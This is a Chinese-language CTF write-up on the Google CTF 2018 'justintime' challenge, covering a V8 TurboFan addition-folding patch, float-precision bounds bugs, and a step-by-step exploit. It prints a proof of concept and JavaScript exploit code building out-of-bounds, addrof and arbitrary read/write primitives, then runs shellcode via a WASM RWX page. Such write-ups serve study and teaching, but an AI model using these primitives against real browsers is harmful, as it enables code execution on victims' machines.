# Google CTF justintime

阅读量 **282544**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-01-07 14:30:28

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t014e018d48f4ff26c3.png)

文章可能有些部分写的不好,希望师傅们批评指正

## 0 环境搭建

具体的题目下载

<https://storage.googleapis.com/gctf-2018-attachments/cd70a91783899292a28926fb9ac3a9d95821560844f2bd43011a5fbf04601a52>

![](https://p4.ssl.qhimg.com/t01e4cbc275a1cc6bc5.png)

解压之后得到上面的文件

打开chrome查看一下v8的版本

![](https://p3.ssl.qhimg.com/t010298c174e6e2acf7.png)

v8的版本是7.0.276.3

####  方法 1

刚开始想要使用git reset hard的方式还原,但是找不到对应版本的hash值,后来想到可以在下面的网站找

<https://chromium.googlesource.com/v8/v8.git/>

找到对应的hash值并还原

![](https://p1.ssl.qhimg.com/t010c768bf2ef31ad91.png)

![](https://p0.ssl.qhimg.com/t0124d7d251c5fec51a.png)

回退到相应的版本后,进行patch(题目下发的patch文件)

patch 这里遇到了一个问题,就是直接使用脚本patch不进去,所以手动将脚本中的代码贴到相应的文件中

使用ninja进行编译

![](https://p1.ssl.qhimg.com/t0173cd37a7e0aef776.png)

####  方法 2

另外还在一个师傅的github上找到了编译好的debug 和 release版的v8 , 可以直接下载

<https://github.com/JeremyFetiveau/pwn-just-in-time-exploit>

**~~但是后期用这个版本调试的时候出现了点问题~~**

####  方法 3

同时也可以使用博客上的build.sh文件

<https://github.com/google/google-ctf/tree/master/2018/finals/pwn-just-in-time>

简单分析一下build.sh文件

    
    
    fetch --nohooks chromium
    cd src
    build/install-build-deps.sh
    gclient runhooks
    
    # https://www.chromium.org/developers/how-tos/get-the-code/working-with-release-branches
    git fetch --tags
    git checkout tags/70.0.3538.9
    gclient sync
    
    gn gen out/Default
    echo << EOF
    Please set the following args:
    > use_jumbo_build=true
    > enable_nacl=false
    > remove_webcore_debug_symbols=true
    > use_goma = true # for googlers
    > is_debug = false
    EOF
    gn args out/Default
    
    git apply ../attachments/nosandbox.patch
    pushd v8
    git apply ../attachments/addition-reducer.patch
    popd
    
    autoninja -C out/Default chrome
    

相关的build文件和patch文件可以从下面的链接下载

<https://github.com/google/google-ctf/tree/master/2018/finals/pwn-just-in-time>

这里的build.sh需要根据自己的路径进行修改

上述的搭建过程可能要proxy

## 1 背景知识

####  1.0 v8 浮点数表示

参考:

<https://en.wikipedia.org/wiki/IEEE_754>

<https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number/MAX_SAFE_INTEGER>

v8用double表示浮点数

![](https://p0.ssl.qhimg.com/t01b7605d47fda606a0.png)

分为符号位S 指数位(EXP) 有效数位(Fraction) 分别为1位 11位 52位

浮点数所能表示的最大值就是将所有的有效数位填满, 一共是53位(转化方式如下图),1111……1 , 值为2^53 – 1 =
9007199254740991. 对应的浮点数0x433fffffffffffff

![](https://p2.ssl.qhimg.com/t01a967aa0e93cc54f9.png)

![](https://p1.ssl.qhimg.com/t01302cf9c480b35e14.png)

因为9007199254740991=11……1b（53位）=1.111……1b*2^52,指数位Exp=1023+52=1075=10000110011b，符号位S为0。

有效数位只有52位,当超过9007199254740991值时,比如9007199254740992,会在有效数位上加1导致溢出,失去精度,其二进制表示为1.0*2^53,由于只有52位,会舍弃最后的一个bit.

同理 参靠de4dcr0w的表格

![](https://p0.ssl.qhimg.com/t01c558c7bf30d19123.png)

图中红框里面的都会被舍弃

####  1.1 解题思路

本题给的是一个chrome,我们首先要找到其v8版本,进行调试,之后在攻击chrome

获取v8版本的方式,打开浏览器,地址栏输入chrome://version

![](https://p4.ssl.qhimg.com/t01455e026de58d9ebb.png)

## 2 漏洞分析

####  2.0 patch分析

题目中给了一个patch文件,引入了一些优化

![](https://p0.ssl.qhimg.com/t011cb8fb14f596f14b.png)

本部分参考了 JeremyFetiveau师傅 sakura师傅 与 Nevv师傅的解释,三位师傅解释的很清楚了,膜拜一波,笔者本部分根据两者进行的理解

具体增加的函数代码如下

    
    
    Reduction DuplicateAdditionReducer::Reduce(Node* node) {
      switch (node->opcode()) {
        case IrOpcode::kNumberAdd:
          return ReduceAddition(node);
        default:
          return NoChange();
      }
    } 
    
    Reduction DuplicateAdditionReducer::ReduceAddition(Node* node) {
      DCHECK_EQ(node->op()->ControlInputCount(), 0);
      DCHECK_EQ(node->op()->EffectInputCount(), 0);
      DCHECK_EQ(node->op()->ValueInputCount(), 2);
    
      Node* left = NodeProperties::GetValueInput(node, 0);
      if (left->opcode() != node->opcode()) {
        return NoChange(); // [1]
      }
    
      Node* right = NodeProperties::GetValueInput(node, 1);
      if (right->opcode() != IrOpcode::kNumberConstant) {
        return NoChange(); // [2]
      }
    
      Node* parent_left = NodeProperties::GetValueInput(left, 0);
      Node* parent_right = NodeProperties::GetValueInput(left, 1);
      if (parent_right->opcode() != IrOpcode::kNumberConstant) {
        return NoChange(); // [3]
      }
    
      double const1 = OpParameter<double>(right->op());
      double const2 = OpParameter<double>(parent_right->op());
    
      Node* new_const = graph()->NewNode(common()->NumberConstant(const1+const2));
    
      NodeProperties::ReplaceValueInput(node, parent_left, 0);
      NodeProperties::ReplaceValueInput(node, new_const, 1);
      return Changed(node); // [4]
    }
    

上面的增加的patch代码是在进行NumberAdd的时候产生的优化.我们有4个不同的代码路径(请阅读代码注释)。其中只有一个会导致节点更改。让我们画一个表示所有这些情况的模式。红色的节点表示它们不满足条件，导致返回NoChange。

![](https://p4.ssl.qhimg.com/t015a55b2ff5e2109bd.png)

case4表示的也就是 x+a+b ， a和b都是Number常量的情况.优化后，会把左边的 a 和 b 相加，相加后的结果替换原有 NumberAdd
右边的NumberConstant，

![](https://p1.ssl.qhimg.com/t0145410362d1858a3f.png)

但是实际情况下

![](https://p5.ssl.qhimg.com/t010b1b5b8587b6bfd8.png)

####  2.1 POC尝试与优化图解

首先针对上面的浮点数背景知识介绍做个test

![](https://p0.ssl.qhimg.com/t01c391370bd52799d3.png)

这是因为有效数位的最后一位被忽视省略了,两个浮点数实际在内存中是一样的.

之后尝试写了一下POC

    
    
    function foo(x)
    {
        let a = [1.0,1.1,1.2,1.3,1.4];
        let temp = (x == 'oob') ? Number.MAX_SAFE_INTEGER+4 : Number.MAX_SAFE_INTEGER+1;
        let tmp = temp + 1 + 1;//trigger optimitisc 
        let idx = tmp - (Number.MAX_SAFE_INTEGER+1);
        return idx;
    }
    
    console.log(foo('oob'));
    console.log(foo(''));
    %OptimizeFunctionOnNextCall(foo);
    console.log(foo('oob'));
    

运行结果如下

![](https://p2.ssl.qhimg.com/t011f61e8ff914d115f.png)

可以看到最后输出了idx 为6 ,但是数组长度总共只有5, 看一下产生的优化图

这里可以看到右边的constant节点2

![](https://p1.ssl.qhimg.com/t01e37bd7957b634832.png)

下面可以看到优化的时候,数组下标范围是(0,4),并且没有了checkbound节点

![](https://p2.ssl.qhimg.com/t0100effcbaf7b60330.png)

但是根据上面的POC,真正编译计算的时候却是可以到达下标6的,所以导致了数组溢出

sakura师傅的[POC](https://xz.aliyun.com/t/3348#toc-1)中对优化过程写的很清楚

    
    
    function foo(doit) {
        let a = [1.1, 1.2, 1.3, 1.4, 1.5, 1.6];
        let x = doit ? 9007199254740992 : 9007199254740991-2;
        x += 1;
        // #29:NumberConstant[1]()  [Type: Range(1, 1)]
        // #30:SpeculativeNumberAdd[Number](#25:Phi, #29:NumberConstant, #26:Checkpoint, #23:Merge)  [Type: Range(9007199254740990, 9007199254740992)]
        x += 1;
        // #29:NumberConstant[1]()  [Type: Range(1, 1)]
        // #31:SpeculativeNumberAdd[Number](#30:SpeculativeNumberAdd, #29:NumberConstant, #30:SpeculativeNumberAdd, #23:Merge)  [Type: Range(9007199254740991, 9007199254740992)]
        x -= 9007199254740991;//解释:range(0,1);编译:(0,3);
        // #32:NumberConstant[9.0072e+15]()  [Type: Range(9007199254740991, 9007199254740991)]
        // #33:SpeculativeNumberSubtract[Number](#31:SpeculativeNumberAdd, #32:NumberConstant, #31:SpeculativeNumberAdd, #23:Merge)  [Type: Range(0, 1)]
        x *= 3;//解释:(0,3);编译:(0,9);
        // #34:NumberConstant[3]()  [Type: Range(3, 3)]
        // #35:SpeculativeNumberMultiply[Number](#33:SpeculativeNumberSubtract, #34:NumberConstant, #33:SpeculativeNumberSubtract, #23:Merge)  [Type: Range(0, 3)]
        x += 2;//解释:(2,5);编译:(2,11);
        // #36:NumberConstant[2]()  [Type: Range(2, 2)]
        // #37:SpeculativeNumberAdd[Number](#35:SpeculativeNumberMultiply, #36:NumberConstant, #35:SpeculativeNumberMultiply, #23:Merge)  [Type: Range(2, 5)]
        a[x] = 2.1729236899484e-311; // (1024).smi2f()
    }
    for (var i = 0; i < 100000; i++){
      foo(true);
    }
    

所以根据上面的分析,我们可以实现一个数组越界

## 3 尝试利用

####  3.0 改变数组大小导致越界

![](https://p2.ssl.qhimg.com/t018cfee2fe59a2cdf2.png)

数组a 是越界数组

obj 和 ABUF是一会利用是用到的

![](https://p2.ssl.qhimg.com/t013c15e38fc79b1b42.png)

根据数组length的位置,确定我们脚本中要修改的index

根据这个idx可以去调整上面脚本中idax的形成过程,加或者乘来达到修改数组大小的效果

修改数组大小的部分脚本如下

    
    
    /*************************************************************
     * File Name: m_exp.js
     * 
     * Created on: 
     * Author: 
     * 
     * Last Modified: 
     * Description: exp for just in time game in google ctf 2018 final 
    ************************************************************/
    function hex(i)
    {
        return i.toString(16).padStart(16, "0");
    }
    const MAX_ITERATIONS = 10000;
    class convert
    {
        constructor()
        {
            this.buf=new ArrayBuffer(8)
            this.uint8array=new Uint8Array(this.buf);
            this.float64array=new Float64Array(this.buf);
            this.uint32array=new Uint32Array(this.buf);
            this.bitint=new BigUint64Array(this.buf);
        }
        f2i(x)//float64 ==> uint64
        {
            this.float64array[0]=x;
            return this.bitint[0];
        }
        i2f(x)
        {
            this.bitint[0]=BigInt(x);
            return this.float64array[0];
        }
    }
    let conv = new convert();
    
    
    
    //oob array
    let oob = undefined;
    let obj = [];
    let ABUF = [];
    
    
    
    
    function foo(x)
    {
        let a = [1.0,1.1,1.2,1.3,1.4,1.5,1.6,1.7,1.8];//change idx 
        // %DebugPrint(a); 
        // %SystemBreak();
        let b = (x == 'oob') ? Number.MAX_SAFE_INTEGER+5:Number.MAX_SAFE_INTEGER+1;
        let tmp = b + 1 + 1 // triger
        let idx = tmp - (Number.MAX_SAFE_INTEGER+1);//opi (0,6)
        idx = idx*2;
        // idx += 2;
        a[idx] = 1.74512933848984e-310;//conv.i2f(0x202000000000);
        return a
    }//why???
    
    foo("oob");
    foo("");
    for(let i=0; i<MAX_ITERATIONS; i++)
    {
        foo("")
    }
    oob = foo("oob");
    console.log("[+] oobArray's length changed to 0x" + hex(oob.length));
    
    
    
    
    // %DebugPrint(oob);
    // %SystemBreak();
    
    
    
    
    
    obj.push({mark:conv.i2f(0x41414141),obj:{}});
    ABUF.push(new ArrayBuffer(0x41));
    
    %DebugPrint(oob);
    %DebugPrint(obj);
    %DebugPrint(ABUF);
    
    for(let i=0;i<0x10;i++)
    {
        new Array(0x1000000);
    }//why???
    
    
    let off_obj = 0;
    for(let i=0;i<2020;i++)
    {
        let temp = conv.f2i(oob[i]);
        if(temp == 0x41414141)
        {
            off_obj = i+1;
            break;
        }
    }
    console.log("[+] off_obj    @"+off_obj);
    
    let back_off = 0;
    for(let i=0;i<2020;i++)
    {
        let tmp = conv.f2i(oob[i]);
        if(tmp == 0x41)
        {
            oob[i] = conv.i2f(0x8);//length
            back_off = i+1;
            break;
        }
    }
    
    
    console.log("[+] back_off   @"+back_off);
    
    
    // CSA_ASSERT failed: IsOffsetInBounds( offset, LoadAndUntagFixedArrayBaseLength(object), 
    // FixedDoubleArray::kHeaderSize, HOLEY_DOUBLE_ELEMENTS) [../../src/code-stub-assembler.cc:2389]这行说明debug模式下,存在数组越界的check,如果想继续调试要想办法绕过
    
    
    
    %SystemBreak();
    

####  3.1 构造任意读写原语与取地址

这个在上一篇文章的[背景知识](https://www.anquanke.com/post/id/214020)中写过了,这里不再赘述

这部分的脚本如下

    
    
    var off_obj = 0;
    for(let i=0;i<200;i++)
    {
        let temp = conv.f2i(oob[i]);
        if(temp == 0x11111111)
        {
            off_obj = i+1;
            break;
        }
    }
    console.log("[+] off_obj    @"+off_obj);
    
    // %SystemBreak();
    // readline();
    
    
    var back_off = 0;
    for(let i=0;i<500;i++)
    {
        let tmp = conv.f2i(oob[i]);
        if(tmp == 0x200)
        {
            //oob[i] = conv.i2f(0x8);//length
            back_off = i+1;
            break;
        }
    }
    
    
    console.log("[+] back_off   @"+back_off);
    
    // CSA_ASSERT failed: IsOffsetInBounds( offset, LoadAndUntagFixedArrayBaseLength(object), 
    // FixedDoubleArray::kHeaderSize, HOLEY_DOUBLE_ELEMENTS) [../../src/code-stub-assembler.cc:2389]
    
    
    
    
    let dataView = new DataView(ABUF[ABUF.length-1]);
    
    function addrof(x)
    {
        obj[0].n = x;
        return conv.f2i(oob[off_obj]);
    }
    
    
    
    function abread(addr)
    {
        oob[back_off] = conv.i2f(addr);
        // let bigint = new BigUint64Array(ABUF);
        // return bigint[0];
        return conv.f2i(dataView.getFloat64(0,true));
    
    
    }
    
    
    function abwrite(addr,payload)
    {
        oob[back_off] = conv.i2f(addr);
        for(let i=0; i<payload.length; i++) {
            dataView.setUint8(i, payload[i]);
        }
    }
    function dataview_write(addr, payload)
    {
        oob[back_off] = conv.i2f(addr);
        for(let i=0; i<payload.length; i++) {
            dataView.setUint8(i, payload[i]);
        }
        return ;
    }
    

下面两张图用来核对obj对象位置

![](https://p3.ssl.qhimg.com/t0144e09728d6a48360.png)

![](https://p0.ssl.qhimg.com/t0110ee6ff9fb63220b.png)

可以看到笔者脚本中设置的obj对象

addrof函数,就是将上图中0x41414141的位置换成我们写入的地址(暂时不知道的脚本对象),再通过oob数组得到地址

![](https://p5.ssl.qhimg.com/t01df76a1e5c202de57.png)

####  3.2 弹出计算器

[同理利用上一次的方法wasm](https://www.anquanke.com/post/id/214020)

创建RWX段

利用addrof原语找到这个段落

使用backstore读写这个地址

![](https://p1.ssl.qhimg.com/t0130111b503f63f35d.png)

![](https://p5.ssl.qhimg.com/t018c448bd3036daed6.png)

下面是笔者调试时候的信息

![](https://p5.ssl.qhimg.com/t019cf5bc2a9c495b56.png)

根据DebugPrint的信息可知道我们的RWX段地址基本上没有错误

最终效果

![](https://p0.ssl.qhimg.com/t018c7baa38c4ffb09f.png)

## 4 遇到的问题

当回退版本号的时候遇到了问题

![](https://p5.ssl.qhimg.com/t01e4baf7caacd3b256.png)

网上有一些说…但是问题没有解决

![](https://p3.ssl.qhimg.com/t01b6cef3098e479a7d.png)

后来突然想到应该跟hash值,但是从网上没有找到对应的hash值

最后回到ctf-time上,下载了相应的版本

每次gclient sync的时候都会在wasm git clone的时候断掉

![](https://p4.ssl.qhimg.com/t01c456669c624074d5.png)

原因是因为gclient sync的时候网速不行,有时断掉,换个梯子就好了

编译时遇到的问题

![](https://p1.ssl.qhimg.com/t011f225e520c02ca69.png)

这个重启了一下解决了,但是具体原因没有搜到

![](https://p3.ssl.qhimg.com/t01f01bcf5ba660263f.png)

补丁死活打不上…..

最后手动将补丁中的代码复制到相关的文件中

在debug模式下崩溃了,调试不了,在release模式调试下触发漏洞失败,但是不调试的时候可以正常跑起来

![](https://p1.ssl.qhimg.com/t012eafd26ee731a78b.png)

这个是debug版本有越界检查,可以根据错误修改源码中的检查重新编译debug版本

笔者之所以碰到上面的问题,是在找RWX段是寻址错了(下图),想要具体找寻原因,然后就遇上了上面调试不了的情况,后来发现是addrof原语写错了,下面就顺利的改了Exp,但是上面这个release版本下漏洞触发失败的问题还需师傅们指点.

![](https://p2.ssl.qhimg.com/t011342471ae07a86ce.png)

~~**release版本为什么直接触发不了暂时没有想到,**~~

最后一步写shellcode的时候出现了下面的问题

![](https://p1.ssl.qhimg.com/t01385a30c86d7ffad2.png)

改了下面的大小(0x200)就好

![](https://p2.ssl.qhimg.com/t01c769094b34658d6d.png)

## 5 参考

<https://github.com/ray-cp/browser_pwn/tree/master/v8_pwn/google-ctf2018-final-just-in-time>

<https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/#preparing-turbolizer>

<https://xz.aliyun.com/t/3348#toc-1>

<https://www.jianshu.com/p/db78899fcd5f>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **‭‭‭‭init-0** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/227493](/post/id/227493)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __1赞

 __收藏

![](https://thirdqq.qlogo.cn/g?b=oidb&k=mFOv1NwnmMMaRPEzzhe16w&s=40&t=1570448917)
‭‭‭‭init-0

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

